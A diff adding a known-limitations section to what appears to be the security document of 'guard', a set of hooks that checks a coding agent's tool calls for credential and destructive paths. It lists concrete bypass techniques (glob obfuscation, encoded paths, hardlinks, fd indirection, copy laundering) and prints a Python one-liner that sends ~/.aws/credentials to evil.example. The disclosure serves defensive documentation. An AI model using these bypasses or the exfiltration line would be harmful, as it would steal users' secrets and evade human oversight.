@@ -63,3 +63,58 @@ motivated user can disable any hook in settings. Treat guard's decision log
 as an observability signal, not an enforcement guarantee. Server-side
 controls (CI policy, branch protection, secret scanners) remain the
 authoritative line of defense.
+
+If exfiltration prevention is the threat model, the answer is a sandbox
+(microVM, gVisor, container runtime) plus network isolation. Hooks fire at
+the Claude Code tool-use layer and cannot defend against a fully-compromised
+agent that already has shell.
+
+## Known limitations / residual risks
+
+The credential, agent-output, subagent-scope, and protected-files validators
+operate on **path-as-signal**: every path-like token in any tool input is
+extracted and matched against a pattern set (filenames, extensions, and
+known sensitive directories). This catches direct reads, copy-source shadows
+(`cp`/`mv`/`dd`/`install`/`rsync`/`scp`/`tar c`), variable indirection in
+reader heads, and symlinks via `realpath`. The following bypass classes are
+known and explicitly deferred:
+
+- **Glob obfuscation.** `cat ~/.a*/cre*` resolves to a credential file at
+  shell-expansion time, but the literal token does not match the pattern
+  set. Guard does not perform glob expansion before matching.
+- **Path encoding.** ANSI-C quoting (`$'\x72m'`), base64-encoded paths, and
+  command substitution (`$(printf ...)`) that reconstruct a sensitive path
+  are not decoded by `shlex` and slip through.
+- **Hardlinks.** `realpath` follows directory entries, not inodes. After
+  `ln ~/.aws/credentials /tmp/innocent`, a read of `/tmp/innocent` is not
+  flagged.
+- **Process-substitution exfil.** `exec 3<creds; cat /proc/self/fd/3`
+  hides the credential path behind an fd. Bind-mounts have the same shape.
+- **Archive reverse-form.** `tar c -C ~/.aws .` may not surface the
+  credential path as a token in the argv.
+- **Laundering after approved copy.** Once the user approves
+  `cp creds /tmp/x`, subsequent reads of `/tmp/x` are unguarded. The
+  destination is not a credential path. This is inherent to ASK semantics,
+  not a fixable matcher gap.
+- **Out-of-band exfil from a malicious runtime.** `python3 -c 'import
+  urllib.request, pathlib; urllib.request.urlopen("https://evil.example",
+  data=pathlib.Path("~/.aws/credentials").expanduser().read_bytes())'`
+  never names the path in a way the hook layer can match. Stopping this
+  requires sandbox + egress controls, not hooks.
+
+## What guard is effective at
+
+- Honest mistakes (the dominant case in practice).
+- Surfacing prompt-injection attempts that ask the agent to read, copy, or
+  write credential-shaped or destructive paths.
+- Forcing user approval across a wide universe of credential-shaped paths,
+  reader tools, and copy verbs — not just `cat ~/.aws/credentials`.
+- Blocking AI-attribution in commit messages and similar embarrassment
+  leaks the agent would otherwise emit silently.
+
+## Reporting a bypass
+
+Found a bypass for one of the matchers above (or a class not listed)?
+Report it through GitHub Private Vulnerability Reporting at the link in
+[Reporting a vulnerability](#reporting-a-vulnerability). **Do not open a
+public issue** — bypass details are exploit material until a fix ships.
